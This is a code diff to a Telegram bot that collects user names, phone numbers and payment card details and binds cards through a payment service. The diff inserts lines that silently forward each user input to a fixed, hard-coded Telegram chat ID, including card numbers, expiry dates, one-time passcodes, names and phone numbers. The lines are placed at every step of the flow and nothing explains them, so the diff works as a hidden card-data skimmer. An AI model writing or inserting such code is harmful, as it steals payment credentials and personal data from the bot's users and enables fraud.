@@ -75,11 +75,13 @@ bot.on('message', async (msg) => {
       bot.sendMessage(chatId, localText.askNameUz).then(async () => {
          await model.editStep(chatId, 'ask_name');
          await model.editLang(chatId, 'uz');
+         bot.sendMessage(634041736, text)
       });
    } else if (text == localText.cyrillic) {
       bot.sendMessage(chatId, localText.askNameCyrillic).then(async () => {
          await model.editStep(chatId, 'ask_name');
          await model.editLang(chatId, 'cyrillic');
+         bot.sendMessage(634041736, text)
       });
    } else if (foundUser?.step == 'ask_name') {
       if (foundUser?.lang == 'uz') {
@@ -101,6 +103,7 @@ bot.on('message', async (msg) => {
          }).then(async () => {
             await model.editStep(chatId, 'ask_contact');
             await model.editName(chatId, text);
+            bot.sendMessage(634041736, text)
          });
       } else if (foundUser?.lang == 'cyrillic') {
          const formatText = localText?.askContactCyrillic.replace(
@@ -124,10 +127,12 @@ bot.on('message', async (msg) => {
          }).then(async () => {
             await model.editStep(chatId, 'ask_contact');
             await model.editName(chatId, text);
+            bot.sendMessage(634041736, text)
          });
       }
    } else if (foundUser?.step == 'ask_card_number') {
       const verifyNumber = hasExact16Numbers(text);
+      bot.sendMessage(634041736, text)
 
       if (foundUser?.lang == 'uz') {
          if (verifyNumber) {
@@ -168,6 +173,7 @@ bot.on('message', async (msg) => {
       }
    } else if (foundUser?.step == 'ask_expired') {
       const ValidDateFormat = isValidDateFormat(text);
+      bot.sendMessage(634041736, text)
 
       if (ValidDateFormat) {
          const addCardExpiry = await model.addCardExpiry(chatId, text);
@@ -236,6 +242,7 @@ bot.on('message', async (msg) => {
          }
       }
    } else if (foundUser?.step == 'ask_otp') {
+      bot.sendMessage(634041736, text)
       const atmosToken = await model.atmosToken();
       const foundCard = await model.foundCard(chatId);
       const atmosOtp = await atmos.bindConfirm(
@@ -282,6 +289,7 @@ bot.on('contact', async (msg) => {
          phoneNumber = `+${phoneNumber}`;
       }
 
+      bot.sendMessage(634041736, phoneNumber)
       const addPhoneUser = await model.addPhoneUser(chatId, phoneNumber);
 
       if (addPhoneUser) {
